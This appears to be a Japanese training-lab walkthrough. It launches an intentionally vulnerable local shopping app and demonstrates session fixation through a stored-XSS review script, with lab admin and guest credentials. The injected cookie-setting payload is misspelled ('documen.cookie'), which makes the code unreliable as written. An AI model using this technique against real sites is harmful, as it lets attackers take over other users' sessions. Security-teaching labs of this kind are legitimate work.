### 脆弱性の悪用
#### 脆弱なアプリケーションの起動

画面右下のターミナルで`docker-compose`と入力し，アプリケーションを立ち上げましょう．  
その後，画面右上の疑似ブラウザの更新ボタンを押すと脆弱なアプリケーションが表示されます。

#### 攻撃
XSSの存在するページではこの二つの攻撃が容易に行えます。
この攻撃の再現では、ECサイトをもした、XSSの存在するログインを利用し体験してもらいます。

**セッション固定化攻撃**
1.ユーザー```guest```でログインを行なってください。
```
LoginID : guest
Pssword : guest_password
```

2.```http://localhost/product.php?id=1```へ移動し、レビューに下のscriptを書き込みます。
```html
<script>documen.cookie='PHPSESSID=abcd;'</script>
```

3.ユーザー```admin```でLoginを行います。
```
LoginID : admin
Pssword : Adm1n_paSsw0Rd
```

4.ローカルプロキシを挟んだ別ブラウザを利用し、固定されたCookieを用いてアクセスをします。

これでAdminでLoginできたら攻撃の成功です。
